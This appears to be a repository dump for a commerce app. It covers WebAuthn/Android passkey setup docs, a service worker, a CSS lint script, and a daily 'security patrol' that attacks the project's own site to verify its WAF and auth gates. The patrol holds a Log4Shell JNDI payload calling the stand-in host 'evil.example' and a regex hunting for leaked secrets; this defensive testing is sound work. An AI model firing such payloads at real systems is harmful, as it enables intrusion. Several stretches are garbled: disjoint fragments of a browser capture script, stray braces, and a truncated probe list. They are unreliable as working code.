| `https://stock.afmarbre.com` (allowlist) | `true` | only if `clientDataJSON.androidPackageName == WEBAUTHN_ANDROID_PACKAGE` **and** the Android integration is configured — this is what `androidx.credentials` produces when the app passes the web origin explicitly via the `origin` parameter of `CreatePublicKeyCredentialRequest` / `GetPublicKeyCredentialRequest` |
| `android:apk-key-hash-sha256:<base64(SHA-256(signing-cert DER))>` | any | accepted **byte-for-byte** against `WEBAUTHN_ANDROID_CERT_HASH` (the format Credential Manager emits) |
| `android:apk-key-hash:<base64(SHA-1(signing-cert DER))>` | any | accepted **byte-for-byte** against the optional `WEBAUTHN_ANDROID_CERT_SHA1` — the legacy prefix documented by Android's FIDO2 stack |

Native-origin matching is **byte-level, not string equality**: the suffix is decoded tolerantly
(base64url or standard alphabet, padded or not) and the raw bytes are compared to the configured
fingerprint, so any encoding Android emits for the correct certificate matches — and only the
correct certificate matches. `data.android.origin` / `data.android.origin_legacy` in the status
response expose the canonical derived values for comparison.

Everything else → `WEBAUTHN_BAD_ORIGIN` / `WEBAUTHN_CROSS_ORIGIN`. The derived origin is exposed at
`GET /api/auth/webauthn/status` (`data.android.origin`) for verification. **Recommended app
integration**: pass `origin = "https://stock.afmarbre.com"` explicitly so web and Android share one
origin; both modes are supported.

> CI note: the unit suite verifies the derivation, acceptance and rejection matrix above with real
> ES256 assertions; a physical-device round-trip cannot run in CI — it is step 4 of the §5 checklist.

1. **RP ID stays the web domain** (`stock.afmarbre.com`). Never use an app-specific domain.
2. **Digital Asset Links** — the worker now serves `GET /.well-known/assetlinks.json`
   (404 until both vars are set). Required entries (served automatically once configured):
   - `delegate_permission/common.handle_all_urls` for `namespace: "android_app"`,
     `package_name: ma.etherealmber.atlascommerce`, SHA-256 fingerprint of the **Play App Signing key**
   - `delegate_permission/common.get_login_creds` for the same package + host (`stock.afmarbre.com`)
3. `WEBAUTHN_ANDROID_PACKAGE=ma.etherealmber.atlascommerce` is **already configured** in
   `wrangler.jsonc`. Add `WEBAUTHN_ANDROID_CERT_HASH=<AA:BB:…>` — the SHA-256 of the **Play app-signing
   key** (Play Console → **Setup → App integrity → App signing key certificate**; the repo keystore is
   local-only via `signing.properties`, so the hash cannot be derived from source). Until the cert hash
   is set, `assetlinks` stays 404, `android.enabled` stays false and native `apk-key-hash` origins are
   rejected — web-origin passkeys keep working untouched. v0.7: the variable accepts a
   **comma-separated list** of SHA-256 fingerprints (Play App Signing key + release/CDN
   keystore) — `assetlinks.json` lists them all (plus the `.debug` package variant) and the
   verifier accepts an origin derived from ANY of them, so Play installs and
   GitHub-Release installs both associate.
4. Allowed origins: Android browsers use the web origin (`https://stock.afmarbre.com`) — already in
   `WEBAUTHN_ALLOWED_ORIGINS`. For native Credential Manager calls the RP-ID association via assetlinks
   is what matters (the origin check applies to web flows).
5. Kotlin: `androidx.credentials` (Credential Manager) — `CreatePublicKeyCredentialRequest` with the
   JSON from `register/options`, `GetPublicKeyCredentialRequest` with `login/options`; pass
   `origin = "https://stock.afmarbre.com"` (§4a); gate both behind `GET /api/auth/webauthn/status`.

## 5. Production configuration & enablement checklist

`wrangler.jsonc` vars (non-secret defaults committed; override per environment as needed):

| Var | Default | Meaning |
|---|---|---|
| `WEBAUTHN_ENABLED` | `"false"` | Master switch. Routes 503 until `"true"` |
| `WEBAUTHN_RP_ID` | `stock.afmarbre.com` | RP ID (domain, no scheme) |
| `WEBAUTHN_RP_NAME` | `Atlas Commerce` | Human-readable RP name |
| `WEBAUTHN_ALLOWED_ORIGINS` | `https://stock.afmarbre.com` | Comma-separated exact-match origins |
| `WEBAUTHN_REQUIRE_UV` | `required` | `required` / `preferred` / `discouraged` |
| `WEBAUTHN_ANDROID_PACKAGE` / `_CERT_HASH` | package set / hash empty | Enable assetlinks + the `apk-key-hash-sha256` native origin |
| `WEBAUTHN_ANDROID_CERT_SHA1` | empty | Optional SHA-1 of the **same** cert — enables the legacy `apk-key-hash` native origin |

**Enable only after ALL of these are true:**
1. This branch is merged **and deployed** to production (`wrangler deploy` via Workers Builds).
2. `GET /api/auth/webauthn/status` returns `enabled: false` (verifier live but gated).
3. Real-device smoke test on a **preview/staging** environment with `WEBAUTHN_ENABLED=true` there:
   register → login → replay old challenge (must fail) → second account with same authenticator (must fail).
4. Android: assetlinks published (`/.well-known/assetlinks.json` returns the statement),
   `status.data.android.origin` (and `origin_legacy` if a SHA-1 is configured) matches the origin
   produced by the signed build — compare on-device via the status endpoint, and
   Credential Manager registration + login succeed on that build.
5. Flip `WEBAUTHN_ENABLED` to `"true"` in production vars and re-deploy. Existing keyless legacy rows
   remain inert; users re-enroll through the verified flow.

## 6. Tests

`worker/__tests__/webauthn.test.ts` (37 tests, real ES256 signatures via WebCrypto + CBOR fixtures):
valid registration/login round-trips; tampered signature; wrong origin / RP ID / challenge; missing UP/UV
flags; wrong `userHandle` (`WEBAUTHN_WRONG_ACCOUNT`); stale counter (+ synced-passkey exception);
replayed & expired & purpose-mismatched & account-bound challenges (atomic single use); packed-attestation
rejection; malformed clientData; policy parsing; opaque user-handle stability; **Android Credential
Manager origin matrix** (apk-key-hash derivation for BOTH the `-sha256` and legacy SHA-1 formats,
byte-level acceptance across base64 alphabets/padding, native registration/login acceptance,
web-origin + package cross-origin acceptance, wrong package / unconfigured rejection). Plus route-level guarantees:
generic failure codes (no enumeration), 503 while disabled, session-bound registration.

FILE: public/sw.js
================================================
/* Atlas Commerce — offline shell, API cache, background sync
 * v9: printable HTML reports / print tabs must never be rewritten as JSON
 */
/* v10 — shell/navigations bypass the HTTP cache entirely: after a deploy the
 * next activation serves the fresh index.html immediately (stale HTTP-cache
 * copies of index.html used to survive deploys and re-poison the precache). */
const CACHE_SHELL = 'atlas-shell-v10';
const CACHE_API = 'atlas-api-v10';
const SHELL = ['/', '/index.html', '/manifest.webmanifest', '/favicon.svg', '/logo.svg', '/logo-mark.svg'];
const OUTBOX_TAG = 'atlas-outbox-sync';

self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_SHELL).then((c) => c.addAll(SHELL.map((p) => new Request(p, { cache: 'no-store' }))).catch(() => {})).then(() => self.skipWaiting())
  );
});

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((keys) =>
      Promise.all(
        keys
          .filter((k) => ![CACHE_SHELL, CACHE_API].includes(k))
          .map((k) => caches.delete(k))
      )
    ).then(() => self.clients.claim())
  );
});

function isApiGet(url) {
  return (
    url.origin === self.location.origin &&
    url.pathname.startsWith('/api/') &&
    !url.pathname.includes('/auth/')
  );
}

function isJsonResponse(res) {
  if (!res || !res.ok) return false;
  const ct = (res.headers.get('content-type') || '').toLowerCase();
  return ct.includes('application/json');
}

/** HTML documents opened in a tab or fetched for print — not JSON APIs. */
function isHtmlDocumentApi(url, req) {
  if (req.mode === 'navigate' || req.destination === 'document') return true;
  const p = url.pathname;
  if (p.startsWith('/api/reports/')) {
    if (p.endsWith('.csv')) return false;
    if (/\/(aging|tva|cogs)\/?$/.test(p)) return false;
    return true;
  }
  if (/^\/api\/(invoices|bills|receipts)\/\d+\/(print|pdf|ubl)(\.xml)?$/.test(p)) return true;
  if (/^\/api\/print\/thermal\/\d+$/.test(p)) return true;
  if (p === '/api/settings/invoice-preview') return true;
  const accept = (req.headers.get('Accept') || '').toLowerCase();
  if (accept.includes('text/html') && !accept.includes('application/json')) return true;
  return false;
}

async function putCache(cacheName, request, response) {
  if (!response || !response.ok) return;
  try {
    const cache = await caches.open(cacheName);
    await cache.put(request, response.clone());
  } catch {
    /* ignore */
  }
}

self.addEventListener('fetch', (event) => {
  const req = event.request;
  if (req.method !== 'GET') return;

  let url;
  try {
    url = new URL(req.url);
  } catch {
    return;
  }

  if (isApiGet(url)) {
    if (isHtmlDocumentApi(url, req)) {
      event.respondWith(
        fetch(req).catch(
          () =>
            new Response(
              '<!DOCTYPE html><html lang="fr"><body style="font-family:system-ui;padding:40px"><p>Hors ligne — impossible d’ouvrir le document.</p></body></html>',
              { status: 503, headers: { 'Content-Type': 'text/html; charset=utf-8' } },
            ),
        ),
      );
      return;
    }

    event.respondWith(
      (async () => {
        try {
          const res = await fetch(req);
          if (isJsonResponse(res)) {
            await putCache(CACHE_API, req, res);
            return res;
          }
          const text = await res.clone().text().catch(() => '');
          if (/<!DOCTYPE|<html/i.test(text)) {
            return new Response(
              JSON.stringify({
                success: false,
                error:
                  "L'API a renvoyé une page HTML au lieu de JSON (route Worker manquante ou timeout). Rechargez après déploiement.",
                code: 'API_RETURNED_HTML',
              }),
              { status: 502, headers: { 'Content-Type': 'application/json' } }
            );
          }
          return res;
        } catch {
          const hit = await caches.match(req);
          if (hit && isJsonResponse(hit)) return hit;
          return new Response(
            JSON.stringify({ success: false, error: 'Hors ligne', offline: true, code: 'OFFLINE' }),
            { status: 503, headers: { 'Content-Type': 'application/json' } }
          );
        }
      })()
    );
    return;
  }

  if (url.origin !== self.location.origin) return;

  if (url.pathname.startsWith('/assets/') || /\.(js|css|svg|png|woff2?)$/.test(url.pathname)) {
    event.respondWith(
      (async () => {
        const hit = await caches.match(req);
        const netPromise = fetch(req)
          .then(async (res) => {
            if (res.ok) await putCache(CACHE_SHELL, req, res);
            return res;
          })
          .catch(() => null);
        if (hit) {
          netPromise.catch(() => {});
          return hit;
        }
        const net = await netPromise;
        return net || new Response('', { status: 504 });
      })()
    );
    return;
  }

  if (req.mode === 'navigate') {
    event.respondWith(
      (async () => {
        try {
          const res = await fetch(req, { cache: 'no-store' });
          if (res.ok) {
            await putCache(CACHE_SHELL, '/', res);
            return res;
          }
          const hit = (await caches.match('/')) || (await caches.match('/index.html'));
          return hit || res;
        } catch {
          return (
            (await caches.match('/')) ||
            (await caches.match('/index.html')) ||
            new Response('Offline', { status: 503 })
          );
        }
      })()
    );
  }
});

async function notifyClientsFlush() {
  const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
  for (const client of clients) {
    try {
      client.postMessage({ type: 'FLUSH_OUTBOX' });
    } catch {
      /* */
    }
  }
}

self.addEventListener('sync', (event) => {
  if (event.tag === OUTBOX_TAG || event.tag === 'atlas-outbox-sync') {
    event.waitUntil(notifyClientsFlush());
  }
});

self.addEventListener('message', (event) => {
  if (event.data?.type === 'REQUEST_SYNC') {
    event.waitUntil(notifyClientsFlush());
  }
  if (event.data?.type === 'SKIP_WAITING') {
    self.skipWaiting();
  }
});

});

        );
      }
      return req.respond({
        status: res.status,
        contentType: res.headers.get('content-type') || 'text/html',
        body,
      });
    }
    return req.continue();
  } catch {
    return req.continue();
  }
});

async function login() {

  const fp = 'capture-fp-0001-v220';
  const ok = await page.evaluate(async (fp) => {
    const r = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Device-Fingerprint': fp },

      localStorage.setItem('stock_auth_user', j.username || 'admin');

      if (j.ip) localStorage.setItem('stock_session_ip', j.ip);

}

  for (let i = 0; i < n; i++) {

});

await browser.close();
console.log('CAPTURE DONE');

#!/usr/bin/env node
/**
 * Themes / CSS guard — three deterministic checks, zero new dependencies.
 *
 *  1. STRUCTURAL (always, all files): balanced braces/parens after comment
 *     stripping, and every hex color has 3/4/6/8 digits.
 *  2. ORDER: dark-force.css must stay the LAST stylesheet imported by
 *     src/main.tsx (it is the single source of truth for dark surfaces and
 *     must win the cascade).
 *  3. NO NEW WHITE IN DARK (pull-request mode only): declarations like
 *     `background: #fff|#ffffff|white` added INSIDE an
 *     html[data-theme="dark"] block fail the check — pre-existing ones are
 *     tolerated so the gate starts green.
 *
 * Exit 0 = pass, 1 = fail with a printed list.
 */
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { execSync } from 'node:child_process';
import path from 'node:path';

const root = process.cwd();
const problems = [];

function cssFiles(dir, out = []) {
  for (const e of readdirSync(dir)) {
    const p = path.join(dir, e);
    const st = statSync(p);
    if (st.isDirectory()) cssFiles(p, out);
    else if (p.endsWith('.css')) out.push(p);
  }
  return out;
}

function stripComments(css) {
  return css.replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, ' '));
}

/** line numbers (1-based) of structural problems in one file */
function structural(file, css) {
  const clean = stripComments(css);
  const lines = clean.split('\n');
  let brace = 0;
  let paren = 0;
  lines.forEach((ln, i) => {
    for (const ch of ln) {
      if (ch === '{') brace++;
      if (ch === '}') brace--;
      if (ch === '(') paren++;
      if (ch === ')') paren--;
      if (brace < 0) problems.push(`${file}:${i + 1}: unexpected "}"`);
      if (paren < 0) problems.push(`${file}:${i + 1}: unexpected ")"`);
    }
    for (const hex of ln.matchAll(/#([0-9a-fA-F]+)(?![0-9a-fA-F-])/g)) {
      if (![3, 4, 6, 8].includes(hex[1].length)) {
        problems.push(`${file}:${i + 1}: invalid hex color "#${hex[1]}"`);
      }
    }
  });
  if (brace !== 0) problems.push(`${file}: unbalanced braces (${brace > 0 ? 'missing ' + brace + ' "}"' : 'extra ' + -brace + ' "}"'})`);
  if (paren !== 0) problems.push(`${file}: unbalanced parentheses (${paren})`);
}

/** line numbers (1-based) where a white background declaration sits inside a dark block */
function whiteInDarkLines(css) {
  const clean = stripComments(css);
  const lines = clean.split('\n');
  const stack = [];
  const hits = new Set();
  let buf = '';
  lines.forEach((ln, i) => {
    // accumulate selector text until "{"
    for (let k = 0; k < ln.length; k++) {
      const ch = ln[k];
      if (ch === '{') {
        stack.push(buf.trim());
        buf = '';
      } else if (ch === '}') {
        stack.pop();
        buf = '';
      } else if (ch === ';') {
        const decl = (buf + ln.slice(0, 0)).trim();
        buf = '';
        void decl;
      } else {
        buf += ch;
      }
    }
    const decl = buf.trim();
    const darkCtx = stack.some((s) => /data-theme=["']?dark/i.test(s));
    if (darkCtx && /(background|background-color)\s*:\s*(#fff\b|#ffffff\b|white\b)/i.test(decl) && !/transparent/i.test(decl)) {
      hits.add(i + 1);
    }
    if (ln.includes(';')) buf = '';
  });
  return hits;
}

function addedLines(file, base) {
  try {
    const out = execSync(
      `git diff -U0 --no-color ${base}...HEAD -- "${file}"`,
      { cwd: root, encoding: 'utf8', maxBuffer: 10 * 1024 * 1024 },
    );
    const added = new Set();
    let cur = 0;
    for (const ln of out.split('\n')) {
      const h = ln.match(/^@@ -\d+(?:,\d+)? \+(\d+)(?:,(\d+))? @@/);
      if (h) {
        cur = Number(h[1]);
        continue;
      }
      if (ln.startsWith('+') && !ln.startsWith('+++')) {
        added.add(cur);
        cur++;
      } else if (ln.startsWith(' ') || ln.startsWith('-')) {
        if (ln.startsWith(' ')) cur++;
      }
    }
    return added;
  } catch {
    return null;
  }
}

// ---- run ------------------------------------------------------------------
const files = cssFiles(path.join(root, 'src'));
for (const f of files) structural(path.relative(root, f), readFileSync(f, 'utf8'));

// dark-force last in main.tsx
const main = readFileSync(path.join(root, 'src/main.tsx'), 'utf8');
const cssImports = [...main.matchAll(/import\s+['"]([^'"]+\.css)['"]/g)].map((m) => m[1]);
if (cssImports.length && !/dark-force\.css$/.test(cssImports[cssImports.length - 1])) {
  problems.push(`src/main.tsx: dark-force.css must be the LAST css import (found "${cssImports[cssImports.length - 1]}" after it)`);
}

// PR mode: no NEW white-in-dark declarations
const base = process.env.GITHUB_BASE_REF ? `origin/${process.env.GITHUB_BASE_REF}` : null;
if (base) {
  for (const f of files) {
    const rel = path.relative(root, f);
    const hits = whiteInDarkLines(readFileSync(f, 'utf8'));
    if (!hits.size) continue;
    const added = addedLines(rel, base);
    if (!added) continue;
    for (const ln of hits) {
      if (added.has(ln)) problems.push(`${rel}:${ln}: new white background inside a dark-theme block`);
    }
  }
}

if (problems.length) {
  console.error('CSS guard FAILED:');
  for (const p of problems) console.error(' - ' + p);
  process.exit(1);
}
console.log(`CSS guard OK — ${files.length} stylesheets checked.`);

      return req.respond({ status: res.status, contentType: res.headers.get('content-type') || 'text/html', body });

  const j = await r.json();

    cls: b.className, pressed: b.getAttribute('aria-pressed'),

  for (const sheet of document.styleSheets) {

    } };

  }

});

#!/usr/bin/env node
/**
 * security-patrol.mjs — external black-box probe of the production site.
 *
 * Run daily by .github/workflows/security-patrol.yml (and on demand). It
 * "tries to hack in" exactly the way an opportunistic attacker would
 * (SQLi, XSS, path traversal, Log4Shell, time-based SQLi, unauthenticated
 * admin access) against OUR OWN production URL, verifies the in-worker WAF
 * and auth gates answer correctly, audits the security headers, and reads
 * the canary's WAF counters to report real intrusion attempts that were
 * detected and blocked since the last deploy.
 *
 * v2 hardening after the first live run (2026-10-22):
 *  - Requests carry an honest, browser-shaped UA; a raw "github-actions"
 *    UA can trip Cloudflare edge bot heuristics and poison every verdict.
 *  - Verdicts are body-aware: a 200 whose JSON says success:false IS a
 *    denial; a 403 whose body is a Cloudflare block/challenge page is EDGE
 *    interception, not our worker WAF (both count as "attack blocked", but
 *    the report says which layer did it).
 *  - Cloudflare edge-cache leaks on authenticated API paths (a real 200
 *    WITH DATA served from cache, cf-cache-status: HIT) are flagged
 *    separately — status codes alone cannot see this.
 *  - Network-level failures (HTTP 0) are retried, then reported as edge
 *    interference with CF dashboard guidance instead of "auth broken".
 *  - Never hand-set content-length (a wrong manual value makes the server
 *    wait for bytes that never arrive → guaranteed timeout).
 *
 * Output: human-readable log on stderr + a single JSON document on stdout
 * between the markers ::PATROL-JSON:: (parsed by the workflow) + report.md.
 * Exit code is always 0 unless the script itself crashes — findings are
 * data, not failures.
 */

import { writeFileSync } from 'node:fs';

const BASE = (process.env.PATROL_BASE_URL || 'https://stock.afmarbre.com').replace(/\/+$/, '');
// Honest but browser-shaped: identifies us, links back to the repo, and
// avoids tripping edge bot heuristics that punish raw "curl/github" UAs.
const UA =
  'Mozilla/5.0 (compatible; AtlasSecurityPatrol/1.0; +https://github.com/Etherealmber/atlas-commerce)';

const CHALLENGE_RE =
  /(just a moment|cf-challenge|challenge-platform|cf-browser-verification|attention required|cloudflare to restrict access|enable javascript and cookies)/i;

const results = [];
function check(id, title, severity, ok, detail, fix) {
  results.push({ id, title, severity: ok ? 'none' : severity, ok, detail, fix: ok ? '' : fix });
  process.stderr.write(`${ok ? 'PASS' : 'FIND'} [${id}] ${title}${ok ? '' : ` — ${detail}`}\n`);
}

async function probe(path, init = {}, { retries = 0, retryDelayMs = 2000 } = {}) {
  const url = `${BASE}${path}`;
  let last = null;
  for (let attempt = 0; attempt <= retries; attempt++) {
    if (attempt > 0) await new Promise((r) => setTimeout(r, retryDelayMs));
    try {
      const res = await fetch(url, {
        redirect: 'manual',
        signal: AbortSignal.timeout(20_000),
        ...init,
        headers: { 'User-Agent': UA, Accept: 'application/json', ...(init.headers || {}) },
      });
      const text = await res.text().catch(() => '');
      return {
        status: res.status,
        headers: Object.fromEntries(res.headers.entries()),
        text: text.slice(0, 4000),
        attempts: attempt + 1,
      };
    } catch (e) {
      last = { status: 0, headers: {}, text: '', error: String(e?.message || e), attempts: attempt + 1 };
    }
  }
  return last;
}

// NOTE: never classify by the `server: cloudflare` header — EVERY response
// from the zone carries it. Edge pages are recognized by their BODY only.
const isEdgePage = (r) => CHALLENGE_RE.test(r.text || '');
// Responses served FROM the edge cache (not just fresh misses). STALE /
// EXPIRED / REVALIDATED still mean the edge stored and replayed it — for an
// authenticated API path that is the same leak class as HIT.
const CACHED_STATES = new Set(['HIT', 'STALE', 'EXPIRED', 'REVALIDATED']);
const cfCache = (r) => (r.headers['cf-cache-status'] || '').toUpperCase();
const fromEdgeCache = (r) => CACHED_STATES.has(cfCache(r));

/** Body-aware denial check for sensitive endpoints. */
function classifyAuthzProbe(r) {
  if (r.status === 0) {
    return { verdict: 'edge-interference', detail: `no HTTP response after ${r.attempts} attempt(s): ${r.error}` };
  }
  if ([401, 403, 404, 405].includes(r.status)) {
    const layer = r.status === 403 && !/WAF_BLOCKED|OWNER_ONLY|UNAUTHORIZED|success/i.test(r.text) && isEdgePage(r) ? ' (Cloudflare edge page)' : '';
    return { verdict: 'denied', detail: `HTTP ${r.status}${layer}` };
  }
  if (r.status >= 200 && r.status < 300) {
    // A JSON error body is still a denial (some gates answer 200 + success:false).
    if (/"success"\s*:\s*false/i.test(r.text) || /(OWNER_ONLY|UNAUTHORIZED|FORBIDDEN)/i.test(r.text)) {
      return { verdict: 'denied', detail: `HTTP ${r.status} with JSON denial body` };
    }
    if (fromEdgeCache(r)) {
      return { verdict: 'cache-leak', detail: `HTTP ${r.status} served from Cloudflare edge cache (cf-cache-status: ${cfCache(r)}) — authenticated API content is being replayed to anonymous visitors` };
    }
    if (isEdgePage(r)) {
      return { verdict: 'edge-interference', detail: `HTTP ${r.status} but the body is a Cloudflare challenge/block page, not our worker's response` };
    }
    return { verdict: 'exposed', detail: `HTTP ${r.status} with non-denial body${cfCache(r) ? ` (cf-cache-status: ${cfCache(r)})` : ''}: ${(r.text || '').slice(0, 160)}` };
  }
  if (r.status >= 500) return { verdict: 'error', detail: `server error HTTP ${r.status}` };
  return { verdict: 'denied', detail: `HTTP ${r.status}` };

  { id: 'waf-log4j', name: 'Log4Shell (JNDI lookup)', path: '/api/products?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D', fix: 'Neither the worker WAF nor the Cloudflare edge blocked the JNDI payload — check WAF_SIGS in worker/index.ts and the CF managed ruleset.' },
];

async function main() {

    headers: { 'Content-Type': 'application/octet-stream' },
    body: postBody,
  }, { retries: 1 });
  if (postRelease.status === 0) {
    check('authz-android-release-post', 'POST release ingestion without Bearer → 401 UNAUTHORIZED', 'medium', false,
      `no HTTP response after ${postRelease.attempts} attempts (${postRelease.error}) — likely Cloudflare edge reset/challenge on a bodied POST from a CI IP`,
      'Cannot verify the endpoint through the edge — CF dashboard → Security → Events: check for a rule challenging/resetting POSTs from GitHub Actions IPs (allow the AtlasSecurityPatrol UA), then re-run the patrol.');
  } else {
    const unauthorizedOk = postRelease.status === 401 && /UNAUTHORIZED/.test(postRelease.text);
    check('authz-android-release-post', 'POST release ingestion without Bearer → 401 UNAUTHORIZED', 'critical', unauthorizedOk,
      `expected 401 UNAUTHORIZED, got HTTP ${postRelease.status}${isEdgePage(postRelease) ? ' (Cloudflare edge page)' : ''}`,
      'POST /api/admin/android-release must reject tokenless uploads with {ok:false,success:false,error:"UNAUTHORIZED"} — check secretMatches() in worker/routes/androidRelease.ts. If the body is a CF page, an edge rule intercepted the probe (Security → Events).');
  }

  // 4. Security headers on the SPA shell
  const home = await probe('/');
  const headerChecks = [
    ['X-Content-Type-Options', 'nosniff', 'medium', "Add `c.header('X-Content-Type-Options', 'nosniff')` in the global middleware of worker/index.ts."],
    ['X-Frame-Options', 'DENY', 'medium', 'Add X-Frame-Options: DENY in the global middleware — protects against clickjacking.'],
    ['Content-Security-Policy', null, 'high', 'The CSP header is missing — restore the policy block in the global middleware of worker/index.ts.'],
    ['Strict-Transport-Security', null, 'high', 'HSTS missing — the header must be set for non-localhost hosts in worker/index.ts (and the request must be HTTPS).'],
    ['Referrer-Policy', null, 'low', 'Referrer-Policy missing — add it to the global security-headers middleware.'],
  ];
  for (const [h, expected, sev, fix] of headerChecks) {
    const v = home.headers[h.toLowerCase()] || '';
    const ok = expected ? v.toLowerCase() === expected.toLowerCase() : v.length > 0;
    check(`header-${h.toLowerCase()}`, `Security header ${h}`, sev, ok,
      `header ${h} = "${v || '(missing)'}" (expected ${expected || 'present'})`, fix);
  }

  // 5. Public update endpoint hygiene
  const upd = await probe('/api/app/android-update?versionCode=1&versionName=0.0.1');
  const noCache = /no-cache/.test(upd.headers['cache-control'] || '');
  const noSecrets = !/(_token|api[_-]?key|secret|password)/i.test(upd.text);
  check('update-endpoint', 'Public update endpoint: no-cache + no secrets', 'high',
    upd.status === 200 && noCache && noSecrets,
    `HTTP ${upd.status}, cache-control="${upd.headers['cache-control'] || '(none)'}", secrets-in-body=${!noSecrets}`,
    'GET /api/app/android-update must be public, answer Cache-Control: no-cache and never include tokens/keys — review buildAndroidUpdateResponse() in worker/routes/androidRelease.ts.');
  const headMirror = await probe('/app-updates/android/latest.json', { method: 'HEAD' });
  check('mirror-head', 'HEAD /app-updates/* answered properly (200/404, not 405)', 'medium',
    headMirror.status === 200 || headMirror.status === 404,
    `HTTP ${headMirror.status}`,
    'HEAD on the CDN1 mirror paths must go through serveAppUpdatesAsset() → bucket.head(); a 405 means the explicit fetch() dispatch in worker/index.ts is missing.');

  await cfSelfHeal(startedAt);
  emit(startedAt, { reachable: true, waf: wafInfo });
}

/* ── Optional Cloudflare integration (set CF_API_TOKEN as a repo secret) ──
 * Token scopes needed (Zone-level for afmarbre.com):
 *   Zone → Read · Zone → Cache Purge → Edit · Zone → Security Events → Read
 * With it the patrol: (1) PURGES any URL it caught being replayed from the
 * edge cache, and (2) looks up the firewall/bot rule that challenged its own
 * requests so the issue names the exact rule to fix. Without it, findings
 * still ship with manual dashboard guidance. CF_ZONE_ID optional (else the
 * zone is resolved from the target hostname). */
async function cfSelfHeal(startedAt) {
  const token = (process.env.CF_API_TOKEN || '').trim();
  if (!token) {
    process.stderr.write('CF_API_TOKEN not set — skipping purge/firewall-event lookup (guidance-only mode)\n');
    return;
  }
  const api = async (path, init = {}) => {
    const res = await fetch(`https://api.cloudflare.com/client/v4${path}`, {
      signal: AbortSignal.timeout(20_000),
      ...init,
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json', ...(init.headers || {}) },
    });
    return res.json().catch(() => ({}));
  };
  let zone = (process.env.CF_ZONE_ID || '').trim();
  try {
    if (!zone) {
      const host = new URL(BASE).hostname.replace(/^[^.]+\./, ''); // stock.afmarbre.com → afmarbre.com
      const z = await api(`/zones?name=${encodeURIComponent(host)}`);
      zone = z?.result?.[0]?.id || '';
    }
    if (!zone) { process.stderr.write('CF zone not resolvable — skipping\n'); return; }

    // 1) Purge every URL caught being served from the edge cache
    const leaked = results.filter((r) => !r.ok && /edge cache|cf-cache-status/i.test(r.detail || ''));
    const purgeFiles = [];
    for (const r of leaked) {
      const p = ({ 'authz-r2-list': '/api/admin/r2/images', 'site-up': '/api/health' })[r.id];
      if (p) purgeFiles.push(BASE + p);
    }
    if (purgeFiles.length) {
      const p = await api(`/zones/${zone}/purge_cache`, { method: 'POST', body: JSON.stringify({ files: purgeFiles }) });
      const note = p?.success ? `✅ Auto-purged from Cloudflare edge cache: ${purgeFiles.join(', ')}` : `⚠️ Purge failed: ${JSON.stringify(p?.errors || p).slice(0, 200)}`;
      for (const r of leaked) { r.detail += ` — ${note}`; process.stderr.write(note + '\n'); }
    }

    // 2) Name the firewall rule that challenged/blocked our probes
    const blocked = results.filter((r) => !r.ok && /challenge|block\/challenge|edge block/i.test(r.detail || ''));
    if (blocked.length) {
      const ev = await api(`/zones/${zone}/security/events/filter`, {
        method: 'POST',
        body: JSON.stringify({ filter: { datetime: { since: startedAt } } }),
      });
      const events = (ev?.result?.info || ev?.result || []).slice ? (ev?.result?.info || ev?.result || []) : [];
      const mine = (Array.isArray(events) ? events : []).filter((e) => /AtlasSecurityPatrol/i.test(JSON.stringify(e))).slice(0, 5);
      if (mine.length) {
        const rule = mine.map((e) => `${e.action || '?'} by ${e.description || e.rule_id || 'unknown rule'}`).join(' | ');
        for (const r of blocked) r.fix = `Cloudflare rule identified from Security Events: ${rule}. Adjust it (CF dashboard → Security → WAF → Tools/Custom rules, or Bot Fight Mode) to ALLOW the AtlasSecurityPatrol UA, then re-run the patrol. ` + r.fix;
        process.stderr.write(`CF security events matched: ${rule}\n`);
      } else {
        process.stderr.write('No matching CF security events found for our UA (events may lag a few minutes)\n');
      }
    }
  } catch (e) {
    process.stderr.write(`CF self-heal skipped: ${e?.message || e}\n`);
  }
}

function emit(startedAt, extra) {
  const findings = results.filter((r) => !r.ok);
  const doc = {
    base: BASE,
    startedAt,
    finishedAt: new Date().toISOString(),
    totalChecks: results.length,
    passed: results.length - findings.length,
    findings,
    results,
    ...extra,
  };
  process.stdout.write('::PATROL-JSON::' + JSON.stringify(doc) + '::END-PATROL-JSON::\n');

  // Human-readable issue body (written next to the JSON for the workflow).
  const waf = doc.waf;
  const lines = [
    `## 🛡️ Security patrol — ${doc.startedAt}`,
    ``,
    `Cible : **${doc.base}** · ${doc.passed}/${doc.totalChecks} contrôles OK`,
    ``,
  ];
  if (waf && waf.blocked) {
    lines.push(
      `### 🚨 Intrusions réelles détectées et bloquées par le WAF`,
      ``,
      `**${waf.blocked} requête(s) malveillante(s)** bloquée(s) depuis le dernier déploiement — dernière signature \`${waf.lastSig || '?'}\` à ${waf.lastAt || '?'}.`,
      `Le pare-feu applicatif fonctionne : ces tentatives ont échoué (403 WAF_BLOCKED), rien à corriger de ce côté.`,
      ``,
    );
  } else {
    lines.push(
      `### ✅ WAF`,
      ``,
      `Aucune tentative d'intrusion bloquée depuis le dernier déploiement (compteur canary à 0).`,
      ``,
    );
  }
  if (findings.length) {
    lines.push(`### ⚠️ Points à corriger (${findings.length})`, ``);
    for (const f of findings) {
      lines.push(`- **[${String(f.severity).toUpperCase()}] ${f.title}** — ${f.detail}`);
      lines.push(`  - 🔧 Fix possible : ${f.fix}`);
    }
    lines.push(``);
  } else {
    lines.push(
      `### ✅ Aucun point à corriger`,
      ``,
      `Toutes les sondes d'intrusion sont bloquées, les en-têtes de sécurité sont présents et les endpoints sensibles refusent les accès non authentifiés.`,
      ``,
    );
  }
  try {
    const out = process.env.PATROL_REPORT || 'report.md';
    writeFileSync(out, lines.join('\n'));
    process.stderr.write(`report written to ${out}\n`);
  } catch (e) {
    process.stderr.write(`report write failed: ${e?.message || e}\n`);
  }
}

main().catch((e) => {
  process.stderr.write(`patrol crashed: ${e?.stack || e}\n`);
  emit(new Date().toISOString(), { reachable: false, crash: String(e?.message || e) });
});

/**
 * Smoke: clientRisk must not flag when no client selected.
 * Run: node scripts/smoke-client-risk.mjs
 */
function norm(s) {
  return String(s || '').toLowerCase().trim();
}
